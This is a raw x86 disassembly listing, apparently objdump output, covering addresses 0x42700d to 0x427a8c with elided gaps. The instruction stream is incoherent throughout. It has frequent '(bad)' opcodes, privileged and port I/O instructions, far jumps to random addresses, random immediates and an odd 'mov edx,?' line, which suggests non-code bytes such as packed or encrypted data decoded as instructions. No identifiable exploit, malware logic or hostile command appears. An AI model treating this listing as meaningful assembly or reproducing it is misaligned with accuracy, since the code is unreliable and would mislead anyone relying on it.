  42700d:	jae    0x427055
  42700f:	dec    ecx
  427010:	pop    edx
  427011:	lds    eax,FWORD PTR [eax+esi*4-0x10886486]
  427018:	pusha  
  427019:	cwde   
  42701a:	jne    0x426fb1
  42701c:	daa    
  42701d:	xchg   esi,eax
  42701e:	and    BYTE PTR [ecx+ebx*1-0x4bf13595],dl
  427025:	mov    eax,DWORD PTR [esp+ebx*2-0x36]
  427029:	(bad)  
  42702a:	int    0xee
  42702c:	sub    BYTE PTR [ebp+0x1b],cl
  42702f:	popa   
  427030:	sub    BYTE PTR [ebp-0x4d],0x16
  427034:	(bad)  
  427035:	retf   
  427036:	repnz sbb DWORD PTR [edx],ecx
  427039:	xchg   DWORD PTR [eax+0x167a1893],edx
  42703f:	inc    edi
  427040:	push   0x5f95d771
  427045:	cmp    BYTE PTR [esi+0x4935f887],dh
  42704b:	cmp    bl,BYTE PTR [ecx]
  42704d:	mov    dh,0x80
  42704f:	ds jmp 0xf0e8b62e
  427055:	mov    eax,ds:0xc40a4399
  42705a:	(bad)  
  42705c:	in     eax,0xc4
  42705e:	enter  0xfee8,0x1f
  427062:	mov    eax,0x8e1ff9c8
  427067:	gs push ebp
  427069:	loopne 0x427040
  42706b:	les    esi,FWORD PTR [edi+0x7a]
  42706e:	xlat   BYTE PTR ds:[ebx]
  42706f:	or     eax,0xca33a9d
  427074:	cmp    edi,esp
  427076:	cmp    bh,BYTE PTR [ebx-0x26fa5781]
  42707c:	jno    0x427086
  42707e:	shl    DWORD PTR [edi-0xd5647e5],1
  427084:	pop    esi
  427085:	shr    BYTE PTR ds:0x6232fed0,0xd
  42708c:	dec    ebp
  42708d:	xlat   BYTE PTR ds:[ebx]
  42708e:	(bad)  
  42708f:	adc    esp,DWORD PTR [eax+eax*1+0x0]
	...
  4270f2:	add    BYTE PTR [eax],al
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xa6449d96
  427102:	xchg   ecx,eax
  427103:	inc    esi
  427104:	fsub   DWORD PTR [ecx+0x1050001]
  42710a:	add    BYTE PTR [eax],al
  42710c:	fild   WORD PTR [ecx+0x4c]
  42710f:	mov    ds:0x9eea68e5,al
  427114:	sar    BYTE PTR [eax+edx*8+0x7bb2379b],cl
  42711b:	mov    eax,ds:0x3bcfe6de
  427120:	pusha  
  427121:	outs   dx,DWORD PTR ds:[esi]
  427122:	nop
  427123:	sbb    al,0x86
  427125:	add    al,0xef
  427127:	jmp    0xa4c3beaa
  42712c:	push   ds
  42712d:	xchg   esp,eax
  42712e:	and    BYTE PTR [edi-0x61],ch
  427131:	mov    esp,0x6ba1ef4
  427136:	mov    bh,0xf1
  427138:	cmp    DWORD PTR [ebx-0x3c9267de],edx
  42713e:	shr    DWORD PTR gs:[edi+0x67],cl
  427142:	xor    DWORD PTR [ecx],edi
  427144:	inc    ebp
  427145:	rep outs dx,BYTE PTR ds:[esi]
  427147:	mov    ss,WORD PTR [esi]
  427149:	jbe    0x427181
  42714b:	mov    al,0xe4
  42714d:	sub    al,0x52
  42714f:	sbb    DWORD PTR [edi-0x54],esi
  427152:	dec    ebx
  427153:	lods   al,BYTE PTR ds:[esi]
  427154:	out    0x5e,al
  427156:	test   eax,0x5a66099f
  42715b:	pushf  
  42715c:	inc    edi
  42715d:	in     al,0x8a
  42715f:	pushf  
  427160:	mov    ebx,0x50bf5d25
  427165:	sbb    eax,0x314dff17
  42716a:	and    BYTE PTR [ebx+edi*4+0x5e4851ce],al
  427171:	out    0x91,eax
  427173:	mov    eax,ds:0xd93f446c
  427178:	mov    edx,?
  42717a:	mov    ds:0x243ab6f4,eax
  42717f:	push   ecx
  427180:	pop    ebx
  427181:	pop    ecx
  427182:	xor    al,0xd2
  427184:	adc    al,0xb1
  427186:	outs   dx,DWORD PTR ds:[esi]
  427187:	pop    eax
  427188:	into   
  427189:	pop    edx
  42718a:	iret   
  42718b:	mov    eax,ds:0x4e8244bf
  427190:	mov    cl,0x18
  427192:	clc    
  427193:	outs   dx,DWORD PTR ds:[esi]
  427194:	lods   al,BYTE PTR ds:[esi]
  427195:	lods   eax,DWORD PTR ds:[esi]
  427196:	inc    ebp
  427197:	mov    ebx,0x7a7f9dd6
  42719c:	aaa    
  42719d:	mov    bl,0xc4
  42719f:	jnp    0x42721a
  4271a1:	cmp    dh,BYTE PTR [ebx]
  4271a3:	in     eax,dx
  4271a4:	mov    edi,0x17e0d95e
  4271a9:	mov    ss,WORD PTR [ecx-0x3a28cc41]
  4271af:	mov    eax,0xa0fd6297
  4271b4:	call   0x397c:0xc21206e2
  4271bb:	sub    dh,BYTE PTR [eax+0x58a551fc]
  4271c1:	out    dx,eax
  4271c2:	mov    ds:0x4582b75d,eax
  4271c7:	mov    al,0x3f
  4271c9:	jge    0x4271c1
  4271cb:	jp     0x4271fe
  4271cd:	aas    
  4271ce:	loopne 0x4271a4
  4271d0:	pop    edi
  4271d1:	rcr    cl,cl
  4271d3:	stos   BYTE PTR es:[edi],al
  4271d4:	loopne 0x427233
  4271d6:	cmp    eax,0xe19a9276
  4271db:	stos   BYTE PTR es:[edi],al
  4271dc:	daa    
  4271dd:	out    0xa1,eax
  4271df:	pop    gs
  4271e1:	jecxz  0x427238
  4271e3:	test   eax,0x56839333
  4271e8:	sti    
  4271e9:	dec    ebx
  4271ea:	sti    
  4271eb:	hlt    
  4271ec:	aam    0xe0
  4271ee:	loopne 0x427182
  4271f0:	push   ss
  4271f1:	mov    esp,0x6807e9f2
  4271f6:	and    esi,DWORD PTR [ebp+0x159d898f]
  4271fc:	or     al,0xca
  4271fe:	mov    ch,0x4f
  427200:	popf   
  427201:	add    esp,ebx
  427203:	fdiv   QWORD PTR [ebx]
  427205:	xor    eax,0x475a96e1
  42720a:	in     eax,dx
  42720b:	dec    ecx
  42720c:	add    BYTE PTR [ebx+0x5],dh
  42720f:	mov    bl,0xf5
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x37833f0f,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	sub    BYTE PTR [esi-0x14f20f5c],bl
  427292:	or     DWORD PTR [edi],0x87b1425e
  427298:	outs   dx,DWORD PTR ds:[esi]
  427299:	fwait
  42729a:	mov    bl,0x78
  42729c:	or     al,0x4e
  42729e:	push   ebp
  42729f:	dec    edx
  4272a0:	clc    
  4272a1:	and    eax,0xb27b5686
  4272a6:	and    DWORD PTR [ecx+ebp*2-0x38],edi
  4272aa:	jb     0x427256
  4272ac:	xchg   edx,eax
  4272ad:	sar    dl,1
  4272af:	dec    BYTE PTR [esi]
  4272b1:	xchg   ebp,eax
  4272b2:	or     al,0x27
  4272b4:	adc    eax,0x370dea5b
  4272b9:	ficom  DWORD PTR [edi]
  4272bb:	test   eax,0x57197423
  4272c0:	data16 sti 
  4272c2:	cmp    BYTE PTR [ebx],al
  4272c4:	push   edx
  4272c5:	fwait
  4272c6:	add    esi,DWORD PTR [ebp-0x64084b3a]
  4272cc:	(bad)  
  4272cd:	hlt    
  4272ce:	fistp  WORD PTR [ebx]
  4272d0:	loope  0x42731b
  4272d2:	pop    ss
  4272d3:	sbb    BYTE PTR [ecx],ah
  4272d5:	push   eax
  4272d6:	dec    edi
  4272d7:	adc    eax,0xfd49768d
  4272dc:	outs   dx,DWORD PTR ds:[esi]
  4272dd:	aad    0x94
  4272df:	cs stos BYTE PTR es:[edi],al
  4272e1:	div    ah
  4272e3:	inc    ebp
  4272e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272e5:	pushf  
  4272e6:	loopne 0x4272c2
  4272e8:	adc    eax,0xf43bf78b
  4272ed:	pushf  
  4272ee:	loop   0x42730f
  4272f0:	lock jl 0x42727b
  4272f3:	mov    al,ds:0x869a434b
  4272f8:	outs   dx,BYTE PTR ds:[esi]
  4272f9:	add    ah,bl
  4272fb:	sub    DWORD PTR [ebx+0x377593de],ecx
  427301:	mov    ebx,0xb4e8a931
  427306:	ret    
  427307:	xchg   ecx,eax
  427308:	repnz push edx
  42730a:	or     DWORD PTR [eax+0x47],edx
  42730d:	shr    bl,0x33
  427310:	test   BYTE PTR [ebx],dl
  427312:	sti    
  427313:	xor    dl,dh
  427315:	nop
  427316:	push   edx
  427317:	je     0x4272f6
  427319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42731a:	push   esp
  42731b:	fwait
  42731c:	mov    dh,0x86
  42731e:	cmp    DWORD PTR [edx-0x40300c16],edx
  427324:	addr16 jle 0x4272f2
  427327:	pusha  
  427328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427329:	test   BYTE PTR [esi+edi*1+0x5c],ch
  42732d:	mov    dl,0xf8
  42732f:	push   edi
  427330:	loope  0x42731f
  427332:	add    BYTE PTR [edi+0x237e98b2],al
  427338:	pop    ebp
  427339:	or     al,0x44
  42733b:	cmp    BYTE PTR [ebp-0x4a872cba],dh
  427341:	and    esp,DWORD PTR [eax-0x173babf]
  427347:	inc    edi
  427348:	fprem1 
  42734a:	jne    0x42738a
  42734c:	add    al,0xf
  42734e:	test   eax,0x338054a6
  427353:	mov    BYTE PTR [eax-0x7f],bh
  427356:	pop    edi
  427357:	mov    cl,0xe4
  427359:	push   ds
  42735a:	pop    ecx
  42735b:	or     ebp,DWORD PTR [ebx-0x77a4f724]
  427361:	mov    ebx,0x98debdf7
  427366:	xchg   ecx,eax
  427367:	push   cs
  427368:	(bad)  
  427369:	cli    
  42736a:	or     ebp,DWORD PTR [esi-0xfe74a4e]
  427370:	in     eax,dx
  427371:	retf   0xe25d
  427374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427375:	in     eax,dx
  427376:	hlt    
  427377:	jp     0x4273c6
  427379:	enter  0xe407,0xe7
  42737d:	repnz out 0xb5,al
  427380:	push   cs
  427381:	mov    edi,0x32974cea
  427386:	push   edi
  427387:	out    dx,eax
  427388:	jle    0x4273aa
  42738a:	mov    al,ds:0xd888d6ba
  42738f:	mov    ds:0xd5,al
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebx,DWORD PTR [ebp+edx*4-0x7f]
  427403:	das    
  427404:	loop   0x4273a9
  427406:	add    DWORD PTR [eax],eax
  427408:	add    eax,0x46000001
  42740d:	mov    esi,eax
  42740f:	dec    ebp
  427410:	in     eax,dx
  427411:	mov    bh,0x62
  427413:	sbb    eax,0xb406f538
  427418:	into   
  427419:	les    ebx,FWORD PTR [edx]
  42741b:	dec    ebp
  42741c:	inc    ecx
  42741d:	and    ecx,0x64
  427420:	push   eax
  427421:	sbb    al,0x92
  427423:	gs aaa 
  427425:	fstp   QWORD PTR [esi]
  427427:	mov    dh,0xa8
  427429:	repz jge 0x42745f
  42742c:	xchg   ebx,eax
  42742d:	pushf  
  42742e:	adc    al,0xb0
  427430:	xor    al,0x74
  427432:	loope  0x42745a
  427434:	cmp    DWORD PTR [ebx+eiz*8+0x38],0x5e
  427439:	bound  ebp,QWORD PTR cs:[edx+0x79]
  42743d:	or     eax,0x55cd558e
  427442:	pop    esi
  427443:	push   ecx
  427444:	out    0x16,al
  427446:	cs add al,0x91
  427449:	in     eax,dx
  42744a:	xchg   ebp,eax
  42744b:	add    DWORD PTR [edx-0x783fa7b0],esp
  427451:	mov    al,0x41
  427453:	xchg   BYTE PTR ds:0xe2575a85,al
  427459:	mov    esi,0x4fca2cec
  42745e:	loopne 0x42747d
  427460:	mov    al,ds:0xa1de817
  427465:	pop    eax
  427466:	into   
  427467:	push   0xffffffaf
  427469:	add    DWORD PTR [esi+0x2390b055],esi
  42746f:	out    dx,al
  427470:	mov    esi,0x666473ef
  427475:	push   eax
  427476:	jno    0x427481
  427478:	into   
  427479:	push   edx
  42747a:	and    eax,0x1dfb29c1
  42747f:	js     0x427454
  427481:	jns    0x427455
  427483:	inc    ecx
  427484:	mov    al,0x81
  427486:	pop    edx
  427487:	aaa    
  427488:	cmp    al,0xbc
  42748a:	jmp    0x2286cde3
  42748f:	in     eax,0xa7
  427491:	pop    es
  427492:	sub    al,0xad
  427494:	xchg   ecx,eax
  427495:	inc    ecx
  427496:	ret    
  427497:	sbb    dl,BYTE PTR [edi+0x5484d277]
  42749d:	enter  0x1958,0x72
  4274a1:	sbb    eax,0x6df959f1
  4274a6:	test   BYTE PTR ds:0x819cabda,dl
  4274ac:	cld    
  4274ad:	nop
  4274ae:	dec    edx
  4274af:	cmp    al,0xb0
  4274b1:	jmp    0x70ea:0x9463baad
  4274b8:	cmp    bl,BYTE PTR [eax+edx*2+0x3f]
  4274bc:	or     BYTE PTR [edi+0x98dff74],ch
  4274c2:	cdq    
  4274c3:	inc    ecx
  4274c4:	fdiv   st(6),st
  4274c6:	sbb    DWORD PTR [edi+esi*4],edi
  4274c9:	(bad)  
  4274ca:	fnsave [eax]
  4274cc:	mov    ch,0x34
  4274ce:	loopne 0x42748c
  4274d0:	pop    eax
  4274d1:	hlt    
  4274d2:	sbb    al,0x4f
  4274d4:	outs   dx,DWORD PTR ds:[esi]
  4274d5:	pop    ecx
  4274d6:	test   al,0x21
  4274d8:	push   edx
  4274d9:	xchg   BYTE PTR [eax+eax*2-0x758c9908],dh
  4274e0:	in     eax,dx
  4274e1:	imul   edi,DWORD PTR [ecx-0x76],0xffffffe2
  4274e5:	pop    ebp
  4274e6:	or     ebx,ecx
  4274e8:	pop    ds
  4274e9:	jbe    0x427479
  4274eb:	iret   
  4274ec:	or     BYTE PTR [ebx+esi*4+0x6b139e60],0xc7
  4274f4:	lods   al,BYTE PTR ds:[esi]
  4274f5:	std    
  4274f6:	je     0x42751b
  4274f8:	sub    eax,0x3e0b4d14
  4274fd:	sub    al,0xc1
  4274ff:	xchg   edi,eax
  427500:	xor    DWORD PTR [esi+edx*1+0x15],edi
  427504:	sub    DWORD PTR [edx-0x27a3cb1c],ebp
  42750a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42750b:	vpmacsdql ymm4,ymm3,ymm0,YMMWORD PTR [esi+ebx*4+0x0]
	...
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	aam    0x9
  427582:	mov    ah,0x63
  427584:	out    0xa4,eax
  427586:	add    DWORD PTR [eax],eax
  427588:	add    eax,0x44000001
  42758d:	idiv   DWORD PTR [ecx]
  42758f:	dec    ebp
  427590:	xchg   ecx,eax
  427591:	cmp    bh,0x3c
  427594:	rcr    esp,0xc
  427597:	retf   
  427598:	ror    DWORD PTR [edx-0x497cea2e],0x1f
  42759f:	mov    ebx,0x1e0dc5b2
  4275a4:	fcom   QWORD PTR [esi-0x14c35ea9]
  4275aa:	ficom  DWORD PTR [eax]
  4275ac:	push   edx
  4275ad:	xor    eax,ecx
  4275af:	mov    al,dh
  4275b1:	mov    edi,0x3f583f82
  4275b6:	mov    ecx,0xeb84fd8e
  4275bb:	ins    BYTE PTR es:[edi],dx
  4275bc:	mov    BYTE PTR [edx],cl
  4275be:	push   edx
  4275bf:	mov    esp,0x4fc29296
  4275c4:	mov    ebp,DWORD PTR [esi]
  4275c6:	dec    ecx
  4275c7:	add    dl,BYTE PTR [edi]
  4275c9:	push   ds
  4275ca:	xchg   BYTE PTR [ebx+edx*1+0x70],dh
  4275ce:	adc    BYTE PTR [edx+0x24],ah
  4275d1:	jnp    0x4275dc
  4275d3:	push   ss
  4275d4:	inc    edx
  4275d5:	hlt    
  4275d6:	cmp    DWORD PTR [ebp+0x33c39185],0x6768f36e
  4275e0:	repz test al,bh
  4275e3:	sbb    ebp,DWORD PTR [ebx]
  4275e5:	add    ebx,DWORD PTR [ecx+0x4e]
  4275e8:	and    DWORD PTR ds:0x7e6caaec,0xbd0719e2
  4275f2:	or     BYTE PTR [edi+0x61],al
  4275f5:	stc    
  4275f6:	adc    ecx,ecx
  4275f8:	add    eax,0x581600ce
  4275fd:	inc    esi
  4275fe:	in     eax,dx
  4275ff:	icebp  
  427600:	ins    BYTE PTR es:[edi],dx
  427601:	fbld   TBYTE PTR [ecx*4-0x3f736964]
  427608:	fst    QWORD PTR [ebx+eax*8]
  42760b:	pop    ebp
  42760c:	out    dx,al
  42760d:	add    al,0x8b
  42760f:	aaa    
  427610:	mov    cl,0x64
  427612:	and    BYTE PTR [esi],0x9f
  427615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427616:	mov    ds:0x7aac402,al
  42761b:	jb     0x4275e0
  42761d:	cmp    ebx,DWORD PTR [eax+0x162b94fb]
  427623:	sbb    DWORD PTR [edx],ebp
  427625:	dec    eax
  427626:	lahf   
  427627:	in     eax,dx
  427628:	mov    cl,0x33
  42762a:	in     eax,0x89
  42762c:	xchg   esi,eax
  42762d:	pop    ebx
  42762e:	add    BYTE PTR [esi],cl
  427630:	ins    DWORD PTR es:[edi],dx
  427631:	aam    0x8a
  427633:	adc    bl,al
  427635:	ficom  DWORD PTR [esi+0x4bb08e66]
  42763b:	cmp    ebp,esp
  42763d:	bound  ecx,QWORD PTR [esi-0x639cbdf0]
  427643:	fild   DWORD PTR [eax+0x3a]
  427646:	mov    DWORD PTR [ecx+edi*2],eax
  427649:	xchg   BYTE PTR [ecx],ch
  42764b:	cdq    
  42764c:	test   BYTE PTR [ebx],ch
  42764e:	arpl   WORD PTR [ecx+edx*2-0x3a2ad26],bp
  427655:	add    eax,0x493d40c5
  42765a:	push   ecx
  42765b:	imul   ecx,DWORD PTR [esi],0xffffff8a
  42765e:	mov    esp,0x7f25b909
  427663:	les    edx,FWORD PTR [esp+edi*8+0x8]
  427667:	mul    BYTE PTR [ebx-0x6e]
  42766a:	popf   
  42766b:	sub    DWORD PTR [eax-0x58],ecx
  42766e:	(bad)  
  42766f:	(bad)  
  427670:	psadbw mm7,QWORD PTR [esi-0x2fa921b7]
  427677:	cmp    edx,DWORD PTR [ebp+ebp*2-0x33]
  42767b:	mov    ds:0x62821368,eax
  427680:	mov    esi,0x2ecf89e9
  427685:	data16 cmp BYTE PTR [ebp-0x60],0x8d
  42768a:	call   0x3e136eab
  42768f:	push   edi
  427690:	pop    ebx
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fstp   DWORD PTR [esi+eax*8-0x5a13cd0d]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0x5c000001
  42770d:	xor    edx,esi
  42770f:	icebp  
  427710:	sbb    DWORD PTR [edx],esi
  427712:	adc    dl,BYTE PTR [eax+0x43a3b68f]
  427718:	xor    DWORD PTR [ecx],0xffffff83
  42771b:	mov    edx,0x6090f2c5
  427720:	adc    al,0x28
  427722:	push   cs
  427723:	jmp    0x427784
  427725:	cld    
  427726:	out    dx,al
  427727:	inc    edx
  427728:	push   ebp
  427729:	div    DWORD PTR ds:0xc9b66212
  42772f:	and    dh,al
  427731:	je     0x42779e
  427733:	inc    esi
  427734:	mov    dl,0x40
  427736:	inc    ebp
  427737:	into   
  427738:	inc    eax
  427739:	xchg   edx,eax
  42773a:	fdivr  DWORD PTR [edi-0x23adefe7]
  427740:	sbb    ebx,DWORD PTR [edi]
  427742:	and    BYTE PTR [esp+edi*1],0x2f
  427746:	mov    ds:0x14554cc7,eax
  42774b:	inc    esp
  42774c:	jno    0x42778d
  42774e:	jle    0x427793
  427750:	int    0x91
  427752:	sub    bl,BYTE PTR [edi+0x13c18b47]
  427758:	pop    edi
  427759:	adc    edi,esi
  42775b:	lods   al,BYTE PTR ds:[esi]
  42775c:	inc    esp
  42775d:	push   esi
  42775e:	enter  0xd323,0x55
  427762:	shl    BYTE PTR [ecx+0x5619eeb9],1
  427768:	js     0x427765
  42776a:	stc    
  42776b:	inc    edi
  42776c:	(bad)  
  42776d:	sbb    al,0x4b
  42776f:	sub    ebp,DWORD PTR [eax-0x64]
  427772:	inc    ebp
  427773:	test   ebx,0xb9e24441
  427779:	outs   dx,BYTE PTR ds:[esi]
  42777a:	jns    0x427798
  42777c:	lahf   
  42777d:	das    
  42777e:	mov    ecx,0xc5c81aa8
  427783:	jo     0x42776f
  427785:	mov    bh,0x33
  427787:	test   al,0xb1
  427789:	mov    edi,0xf91cbfc
  42778e:	push   ecx
  42778f:	pop    esi
  427790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427791:	cwde   
  427792:	std    
  427793:	test   BYTE PTR [ebp-0x37],bl
  427796:	push   ecx
  427797:	jns    0x427812
  427799:	jp     0x4277bd
  42779b:	mov    bl,0x67
  42779d:	sub    eax,0xa434a58c
  4277a2:	lds    ecx,FWORD PTR [edi+0xd1af97c]
  4277a8:	sub    BYTE PTR [edx+ebp*1],0x50
  4277ac:	dec    edx
  4277ad:	and    dh,BYTE PTR [ebx]
  4277af:	outs   dx,DWORD PTR ds:[esi]
  4277b0:	adc    DWORD PTR [esi+esi*8],ecx
  4277b3:	int3   
  4277b4:	mov    al,0xe7
  4277b6:	mov    ds:0xa00fc0c7,al
  4277bb:	rcr    edx,cl
  4277bd:	scas   al,BYTE PTR es:[edi]
  4277be:	xor    eax,0xe3052b2c
  4277c3:	loope  0x42778c
  4277c5:	dec    esp
  4277c6:	call   0x992f:0xd99a41f9
  4277cd:	pop    ds
  4277ce:	jbe    0x427794
  4277d0:	nop
  4277d1:	leave  
  4277d2:	xchg   edx,eax
  4277d3:	mov    edi,0xcd6ebea4
  4277d8:	and    ah,BYTE PTR [eax+0x59]
  4277db:	nop
  4277dc:	in     al,0x33
  4277de:	les    ecx,FWORD PTR [edx-0x51]
  4277e1:	adc    BYTE PTR [esp+eiz*4+0xd54e5e2],ch
  4277e8:	ret    0xb2be
  4277eb:	mov    esi,0x3d942a1
  4277f0:	xor    ebp,ebp
  4277f2:	dec    ebx
  4277f3:	(bad)  [edx+0x5afc5db7]
  4277f9:	push   ecx
  4277fa:	loopne 0x42781b
  4277fc:	(bad)  
  4277fd:	jecxz  0x427829
  4277ff:	jl     0x7313961d
  427805:	xchg   ecx,eax
  427806:	lods   al,BYTE PTR ds:[esi]
  427807:	out    0xba,al
  427809:	inc    edx
  42780a:	unpckhps xmm1,xmm2
  42780d:	pop    ss
  42780e:	addr16 xchg ebp,esi
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	call   eax
  427882:	cs and dh,cl
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0x84000001
  42788d:	ss or  ch,dl
  427890:	mov    ecx,0xcee4bba9
  427895:	push   ds
  427896:	or     BYTE PTR [ebp-0x1],bh
  427899:	inc    edi
  42789a:	inc    esi
  42789b:	test   eax,0x828ce08f
  4278a0:	lahf   
  4278a1:	call   0x9ec7:0x6fab1919
  4278a8:	mov    dh,BYTE PTR [edx]
  4278aa:	shl    ch,cl
  4278ac:	iret   
  4278ad:	jno    0x4278ce
  4278af:	sbb    eax,0xf8573984
  4278b4:	inc    esp
  4278b5:	adc    al,0x93
  4278b7:	push   ebx
  4278b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278ba:	inc    ecx
  4278bb:	loopne 0x427906
  4278bd:	test   DWORD PTR [esp+ebx*2-0x5faf0380],0xa8daeb27
  4278c8:	hlt    
  4278c9:	retf   0xa276
  4278cc:	js     0x4278e8
  4278ce:	sbb    al,0x92
  4278d0:	or     eax,0xbccfb80e
  4278d5:	mov    bl,0x34
  4278d7:	loop   0x427861
  4278d9:	add    esi,eax
  4278db:	add    eax,0xf62bc70f
  4278e0:	pop    ebx
  4278e1:	mov    ecx,0x57267d54
  4278e6:	xlat   BYTE PTR ds:[ebx]
  4278e7:	test   DWORD PTR [ecx],esp
  4278e9:	dec    eax
  4278ea:	sbb    BYTE PTR [ecx-0x1a9a240b],cl
  4278f0:	nop
  4278f1:	xlat   BYTE PTR ds:[ebx]
  4278f2:	inc    edx
  4278f3:	outs   dx,BYTE PTR ds:[esi]
  4278f4:	cmp    al,0x1e
  4278f6:	nop/reserved BYTE PTR [edx-0x20]
  4278fa:	sub    BYTE PTR [ebx-0x44ffe5cb],bh
  427900:	push   cs
  427901:	shr    BYTE PTR [eax+0x1174f92e],cl
  427907:	mov    edi,0xc6bf85e6
  42790c:	rcr    BYTE PTR [eax*2+0x28a7734d],0x88
  427914:	scas   al,BYTE PTR es:[edi]
  427915:	push   es
  427916:	sbb    al,0x9c
  427918:	fld    QWORD PTR ds:0x2b134bbe
  42791e:	adc    cl,BYTE PTR [edi-0xc]
  427921:	jle    0x42799a
  427923:	bound  edi,QWORD PTR [ecx]
  427925:	add    al,0x51
  427927:	(bad)  
  427928:	das    
  427929:	push   0x40
  42792b:	sbb    eax,0x13b8f537
  427930:	mov    bh,0x52
  427932:	pop    esp
  427933:	repnz add al,0x4d
  427936:	and    dl,dh
  427938:	(bad)  
  427939:	mov    al,0xcf
  42793b:	jno    0x42799b
  42793d:	(bad)  
  42793e:	dec    BYTE PTR [ecx-0x23]
  427941:	pop    edx
  427942:	xchg   edx,eax
  427943:	fcmovnb st,st(4)
  427945:	sub    cl,0xa0
  427948:	push   edx
  427949:	push   esi
  42794a:	jb     0x4279ac
  42794c:	stos   DWORD PTR es:[edi],eax
  42794d:	inc    edi
  42794e:	test   al,0x43
  427950:	xor    ah,BYTE PTR [ecx-0x34]
  427953:	cmc    
  427954:	lock clc 
  427956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427957:	inc    edx
  427958:	push   0xc5a1040a
  42795d:	loopne 0x4278ed
  42795f:	sub    BYTE PTR [ebx],bl
  427961:	in     eax,dx
  427962:	or     al,0x93
  427964:	sub    BYTE PTR [edi+0x44816f15],cl
  42796a:	pop    edi
  42796b:	fcom   DWORD PTR [ecx]
  42796d:	xor    dl,dl
  42796f:	enter  0xff47,0xf5
  427973:	inc    ebp
  427974:	push   edi
  427975:	sbb    ebx,DWORD PTR [esi]
  427977:	pop    esp
  427978:	out    dx,eax
  427979:	imul   esi,DWORD PTR [ecx],0xffffff8e
  42797c:	pop    esi
  42797d:	jmp    0x3a171018
  427982:	xchg   edi,eax
  427983:	test   al,0x4f
  427985:	push   edx
  427986:	not    DWORD PTR [esi+0x3e]
  427989:	push   esi
  42798a:	test   al,0x70
  42798c:	ja     0x427933
  42798e:	dec    edi
  42798f:	retf   
  427990:	dec    eax
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x46ffca1b]
  427a04:	mul    BYTE PTR [edi+0x1050001]
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	mov    ds:0x82601afa,al
  427a11:	test   dl,bh
  427a13:	pop    gs
  427a15:	inc    ebx
  427a16:	fnsave [edi+0x18badb4f]
  427a1c:	push   ebp
  427a1d:	test   al,0x23
  427a1f:	retf   0x82a3
  427a22:	mov    ch,0x76
  427a24:	xchg   ebx,eax
  427a25:	mul    DWORD PTR [ebx-0x512d2106]
  427a2b:	adc    eax,0x95b3777e
  427a30:	idiv   DWORD PTR [ebp-0x5f]
  427a33:	adc    eax,edx
  427a35:	sbb    ecx,DWORD PTR [eax-0x4e]
  427a38:	mov    bl,BYTE PTR ds:0x2b2b14c7
  427a3e:	cmp    al,0x5a
  427a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a41:	cmp    eax,0xd0ce8a23
  427a46:	jnp    0x427a2c
  427a48:	inc    ebx
  427a49:	xchg   ebx,eax
  427a4a:	inc    ebp
  427a4b:	xchg   ecx,eax
  427a4c:	bound  esp,QWORD PTR [edi+0x55]
  427a4f:	je     0x427a14
  427a51:	jnp    0x427a22
  427a53:	fwait
  427a54:	mov    ebp,0x1b300f7f
  427a59:	and    BYTE PTR [edi],ch
  427a5b:	bound  ebp,QWORD PTR [edi+0x6fcc161d]
  427a61:	or     dh,BYTE PTR [ecx+0x52]
  427a64:	jbe    0x427a4b
  427a66:	sbb    esi,DWORD PTR [ebp+0x5f7c59e6]
  427a6c:	xor    ah,ah
  427a6e:	sbb    eax,ecx
  427a70:	push   eax
  427a71:	int    0x80
  427a73:	mov    BYTE PTR [edx+0x61197d1b],bl
  427a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a7a:	fld    st(5)
  427a7c:	popf   
  427a7d:	imul   esp,esi,0xfffffff6
  427a80:	stos   DWORD PTR es:[edi],eax
  427a81:	dec    ebp
  427a82:	scas   eax,DWORD PTR es:[edi]
  427a83:	dec    eax
  427a84:	stos   BYTE PTR es:[edi],al
  427a85:	scas   al,BYTE PTR es:[edi]
  427a86:	(bad)  
  427a87:	mov    ebx,0xb4b35cc4
  427a8c:	cmc    
